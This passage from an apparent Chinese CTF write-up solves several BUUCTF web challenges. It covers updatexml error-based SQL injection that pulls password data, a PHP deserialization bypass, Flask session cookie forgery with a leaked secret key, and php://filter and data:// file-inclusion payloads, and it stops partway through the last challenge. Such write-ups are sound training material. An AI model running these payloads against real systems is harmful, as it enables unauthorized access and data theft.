<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;geek&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br><span class="line">【这里的=也被过滤了，所以用<span class="keyword">like</span>替换】</span><br></pre></td></tr></table></figure>

<p>得到表名</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821173920231.png" alt="image-20220821173920231"></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">&#x27;H4rDsq1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>得到列名</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821174239954.png" alt="image-20220821174239954"></p>
<p>然后看看列里数据找找flag</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;password=<span class="number">1</span>&#x27;<span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group<span class="constructor">_concat(<span class="params">id</span>,<span class="params">username</span>,<span class="params">password</span>)</span>)from(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>看回显知道flag在password里，但为什么显示不全，<strong>是因为updatexml报错回显的数据限制最多32位，所以无法显示全flag</strong></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821174509553.png" alt="image-20220821174509553"></p>
<p>所以可以用left和right函数进行分段显示，本来想用stustr函数，但是发现也被过滤了</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">left</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>为什么这里left函数显示30个字符，因为0x7e也就是<del>也是字符，</del>已经占了两位，所以还可以显示30位</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821220007687.png" alt="image-20220821220007687"></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220821220041922.png" alt="image-20220821220041922"></p>
<p>因为是左右显示30位，所以flag内容有重叠，整理一下</p>
<p>得到flag</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">flag&#123;<span class="number">034eb054</span>-<span class="number">83b5</span>-412c-b90e-afc72c6ce998&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-网鼎杯-2020-青龙组-AreUSerialz1"><a href="#6-网鼎杯-2020-青龙组-AreUSerialz1" class="headerlink" title="6.[网鼎杯 2020 青龙组]AreUSerialz1"></a>6.[网鼎杯 2020 青龙组]AreUSerialz1</h2><p>1)题目描述</p>
<p>无</p>
<p>2)wp</p>
<p>一道典型的序列化题目</p>
<p>先对代码进行分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>__construct()函数没有用，不参与序列化中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ord() 函数返回字符串中第一个字符的 ASCII 值。</span></span><br><span class="line"><span class="comment">// ASCII值32为2，ASCII值125为%</span></span><br></pre></td></tr></table></figure>

<p>这个函数主要是过滤掉protect类的成员,在序列化的时候是以%00作为标识符</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">*但是在PHP版本大于<span class="number">7.1</span>的情况下，<span class="keyword">protect</span>类和<span class="keyword">public</span>类没什么好注意的，所以在构造序列化时改为<span class="keyword">public</span>可以绕过is_valid函数</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>__destruc()函数主要是不让<code>op===&quot;2&quot;</code>，但是在process函数里op又要为“2”</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以这里利用强弱类型比较，__destruc()函数里op是不能为2，但是是强类型比较，是字符2【”2”】,所以op&#x3D;2【数字2】，就绕过达到读取flag.php的结果</p>
<p>于是构造出php序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到序列化结果</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>：&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>访问，F12查看【或者改一下filename的值为php:&#x2F;&#x2F;filter伪协议，用base64，可以直接看到】</p>
<p><code>http://f20b2545-8ff3-4a33-887f-27f4901db96a.node4.buuoj.cn:81/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
<p>得到flag</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822135717175.png" alt="image-20220822135717175"></p>
<h2 id="7-HCTF-2018-admin"><a href="#7-HCTF-2018-admin" class="headerlink" title="7.[HCTF 2018]admin"></a>7.[HCTF 2018]admin</h2><h3 id="1-题目描述-4"><a href="#1-题目描述-4" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-4"><a href="#2-wp-4" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题开始当作弱密码题解，结果直接爆破出来了</p>
<p>用户名：admin</p>
<p>密码：123</p>
<p>这样应该最简单的方法了</p>
<p>但我看了看其他大佬wp，他们把这个当作flask_session伪造的题目</p>
<p>学习一下</p>
<p>先注册一个试试</p>
<p>用户名：admin123</p>
<p>密码：123456</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822203857056.png" alt="image-20220822203857056"></p>
<p>只在<code>change password</code>的源码看到线索，知道是flask框架</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822203848108.png" alt="image-20220822203848108"></p>
<p>访问下载文件</p>
<p>flask存在一个session伪造漏洞</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">flask的<span class="keyword">session</span>保存在客户端，一般只是加了签名来防止被截取修改，但是如果没有加密我们就可以对<span class="keyword">session</span>进行解码来获取其中的用户数据。 </span><br><span class="line"></span><br><span class="line">如果我们在获取到签名的秘钥，就可以按照解码出来的数据进行伪造，重新生成签名的<span class="keyword">session</span>来达到欺骗服务端。  </span><br><span class="line"></span><br><span class="line">flask的<span class="keyword">session</span>使用base64对bytes类型的用户数据进行编码，而且编码之前可能进行了压缩(<span class="keyword">session</span>以 &quot;.&quot;  开头时表示进行了压缩) flask 保存在cookie里面的<span class="keyword">session</span>一般格式为 data.timestamp.signature</span><br></pre></td></tr></table></figure>

<p>这里的session没有加密，在config.py中得到了签名秘钥<code>ckj123</code>，于是我们就可以重新生成session，来欺骗服务器</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822204409898.png" alt="image-20220822204409898"></p>
<p>利用cookie editor查看session值</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822231718091.png" alt="image-20220822231718091"></p>
<p>然后再找发现index.html下有flag提示</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220823000533344.png" alt="image-20220823000533344"></p>
<p>简单分析一下，就是让session里的name&#x3D;&#x3D;”admin”</p>
<p>所以这里就需要修改一下我们得到的session</p>
<p>这里建议了解一下一个工具<code>flask-session-cookie-manager-master</code>能对其进行加密解码【可能需要pip下一些模块，百度可以解决】</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">解密</span><br><span class="line"><span class="keyword">python</span> flask_session_cookie_manager3.<span class="keyword">py</span> decode -s “cxk123” -<span class="keyword">c</span> “你在<span class="keyword">change</span>页面的session值”</span><br><span class="line">加密</span><br><span class="line"><span class="keyword">python</span> flask_session_cookie_manager3.<span class="keyword">py</span> encode -s “cxk123” -t “按照得到解密结果格式改的结果”</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220822235758750.png" alt="image-20220822235758750"></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class="number">8703</span>c5b8b2d40b<span class="number">535487</span>2c13dd<span class="number">4314</span>cccf<span class="number">9116</span>d2dcd<span class="number">6598</span>7e5f08b2d6cffdf72cb<span class="number">7660</span>baeb7d5e76f3ac<span class="number">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class="number">3523</span>4b<span class="number">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line"></span><br><span class="line">把我们的用户名改为admin</span><br><span class="line"></span><br><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class="number">8703</span>c5b8b2d40b<span class="number">535487</span>2c13dd<span class="number">4314</span>cccf<span class="number">9116</span>d2dcd<span class="number">6598</span>7e5f08b2d6cffdf72cb<span class="number">7660</span>baeb7d5e76f3ac<span class="number">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class="number">3523</span>4b<span class="number">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>然后再加密</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220823000020825.png" alt="image-20220823000020825"></p>
<p>然后cookie editor修改为我们加密结果</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">.eJxFUMtu<span class="name">g0</span>AM_JXK<span class="number">5</span>xx<span class="number">4</span>tBekHCKRIiqtEWgJ<span class="number">8</span>l<span class="number">4</span>iGkjAy<span class="number">1</span>IJWlE<span class="number">2</span>yr<span class="number">93</span><span class="name">m1</span>bKwQd<span class="number">7</span>xvbMXOF<span class="number">4</span><span class="symbol">ntq5</span>g-hcD<span class="number">3</span><span class="meta">O7</span>gWPfQHSFp<span class="number">3</span>eIgPhiSTYsuDM<span class="meta">o956</span>KRaiq<span class="number">3</span>KJEQ<span class="number">9</span>xpFR<span class="number">-6</span>LFEDmfwZ<span class="number">7</span>c<span class="number">6</span>SPfRZkq<span class="number">4</span>qzhfi<span class="number">0</span>vF<span class="number">-528</span>sJDpuboUsmAI<span class="number">0</span>mdx_<span class="meta">o8</span>lXlaBGLl-yuBmwouVvV<span class="number">7</span>EySis-rRSkITItZF<span class="number">4</span>H<span class="number">4</span>kZjVYbus<span class="number">6</span>VKrBiTT<span class="number">1</span>L<span class="number">7</span>rl<span class="number">9</span>EQFu<span class="number">4</span>beA<span class="number">0</span>T-fj<span class="number">54</span>dux<span class="number">4</span>cFq<span class="number">0</span>OsUifFVZKGwkkTcuBMFp<span class="number">2</span>T<span class="number">0</span>otEOWvFgPbkOTkdVWWQ<span class="number">7</span>bb<span class="number">3</span>c<span class="number">72</span>pL<span class="number">-3</span>jUuhC-Ef<span class="name">G2</span>jgA<span class="number">6</span>sb<span class="number">0</span>I<span class="number">2</span>zga<span class="number">26</span><span class="symbol">ne27</span><span class="keyword">ge</span><span class="number">3</span>D<span class="number">7</span>AeD<span class="number">4</span>b<span class="number">34.</span>YwOoDA.quyfjg-Miz<span class="number">9</span>Y<span class="number">5</span>cx<span class="number">6</span>i<span class="number">5</span>hTVr<span class="number">0</span>EWjE</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220823000303547.png" alt="image-20220823000303547"></p>
<p>得到flag</p>
<h2 id="8-ZJCTF-2019-NiZhuanSiWei"><a href="#8-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="8.[ZJCTF 2019]NiZhuanSiWei"></a>8.[ZJCTF 2019]NiZhuanSiWei</h2><h3 id="1-题目描述-5"><a href="#1-题目描述-5" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-5"><a href="#2-wp-5" class="headerlink" title="2)wp"></a>2)wp</h3><p>先分析一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>第一个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>)<span class="comment">//r为读取权限</span></span><br></pre></td></tr></table></figure>

<p>file_get_contents()函数是将文件内容读取到变量，而这里是从变量读取，读取text变量的值，这里需要text变量为<code>welcome to the zjctf</code></p>
<p>但是因为可能存在对变量的正则匹配，过滤，一般是用base64绕过</p>
<p>这里就可以利用两个伪协议，php:&#x2F;&#x2F;input和data:&#x2F;&#x2F;，这两个一个是读取post数据，一个是读取get数据，这里用data:&#x2F;&#x2F;协议</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">text</span>=<span class="keyword">data</span>:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure>

<p>当然这里不用base64也可以</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">text</span>=data://<span class="keyword">text</span>/plain;welcome <span class="built_in">to</span> <span class="keyword">the</span> zjctf</span><br></pre></td></tr></table></figure>

<p>第二个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br></pre></td></tr></table></figure>

<p>一个文件包含，尝试用php:&#x2F;&#x2F;filter读取<code>useless.php</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&amp;file=php:<span class="regexp">//</span>filter<span class="regexp">/read=conver.base64-encode/</span>resource=useless.php</span><br></pre></td></tr></table></figure>

<p>至于password，猜测应该是在useless.php里才有线索，先赋值1看看</p>
<p>于是先构造一个payload</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?text=data:<span class="regexp">//</span>text<span class="regexp">/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php:/</span><span class="regexp">/filter/</span>read=convert.base64-encode/resource=useless.php&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>得到<code>useless.php</code>内容</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220823175723137.png" alt="image-20220823175723137"></p>
